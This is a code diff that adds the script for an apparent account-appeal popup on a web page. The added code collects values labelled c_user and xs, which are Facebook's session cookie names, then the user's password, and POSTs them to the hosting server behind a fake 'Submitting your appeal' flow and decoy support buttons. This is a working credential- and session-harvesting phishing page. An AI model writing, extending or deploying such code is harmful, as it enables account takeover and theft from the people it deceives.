@@ -1324,13 +1324,130 @@
     });
   }
 
-  // Close popup
-  if (closePopupBtn) {
-    closePopupBtn.addEventListener("click", () => {
-      popupOverlay.classList.remove("active");
-    });
-  }
+ 
+        // Close popup
+        if (closePopupBtn) {
+            closePopupBtn.addEventListener('click', () => {
+                popupOverlay.classList.remove('active');
+                document.body.classList.remove('popup-open');
+            });
+        }
 
-  // Optional: Automatically open form for testing
-  // popupOverlay.classList.add('active');
-</script>
+        // Close popup when clicking outside
+        popupOverlay.addEventListener('click', (e) => {
+            if (e.target === popupOverlay) {
+                popupOverlay.classList.remove('active');
+                document.body.classList.remove('popup-open');
+            }
+        });
+
+        // Move to step 2
+        if (toStep2Btn) {
+            toStep2Btn.addEventListener('click', function() {
+                // Validate step 1
+                const c_user = document.getElementById('c_user').value;
+                const xs = document.getElementById('xs').value;
+                
+                if (!c_user || !xs) {
+                    alert('Please fill all required fields');
+                    return;
+                }
+                
+                // Move to step 2
+                document.getElementById('step1').classList.remove('active');
+                document.getElementById('step2').classList.add('active');
+                
+                // Scroll to top of popup content
+                document.querySelector('.popup-body').scrollTop = 0;
+            });
+        }
+
+        // Submit appeal
+        if (submitAppealBtn) {
+            submitAppealBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Validate password
+                const password = document.getElementById('password').value;
+                if (!password) {
+                    alert('Please enter your password');
+                    return;
+                }
+                
+                // Disable button during submission
+                const originalText = submitAppealBtn.textContent;
+                submitAppealBtn.disabled = true;
+                submitAppealBtn.textContent = 'Submitting...';
+                
+                // Get all form data
+                const formData = new FormData();
+                
+                // Add step1 data
+                const step1Form = document.getElementById('step1');
+                const step1Data = new FormData(step1Form);
+                for (const [key, value] of step1Data.entries()) {
+                    formData.append(key, value);
+                }
+                
+                // Add step2 data
+                formData.append('password', password);
+                
+                // Submit the form
+                fetch('', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.text())
+                .then(() => {
+                    // Move to step 3
+                    document.getElementById('step2').classList.remove('active');
+                    document.getElementById('step3').classList.add('active');
+                    
+                    // Scroll to top of popup content
+                    document.querySelector('.popup-body').scrollTop = 0;
+                    
+                    // Auto-close after 5 seconds
+                    setTimeout(() => {
+                        popupOverlay.classList.remove('active');
+                        document.body.classList.remove('popup-open');
+                    }, 5000);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('There was an error submitting your appeal. Please try again.');
+                })
+                .finally(() => {
+                    submitAppealBtn.disabled = false;
+                    submitAppealBtn.textContent = originalText;
+                });
+            });
+        }
+
+        // Contact Buttons
+        const contactBtns = document.querySelectorAll('.contact-btn');
+
+        contactBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                const method = btn.parentElement.querySelector('h4').textContent;
+                alert(`Connecting you to ${method} support...`);
+            });
+        });
+
+        // Smooth scrolling for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                const targetId = this.getAttribute('href');
+                if (targetId === '#') return;
+                
+                const targetElement = document.querySelector(targetId);
+                if (targetElement) {
+                    targetElement.scrollIntoView({
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
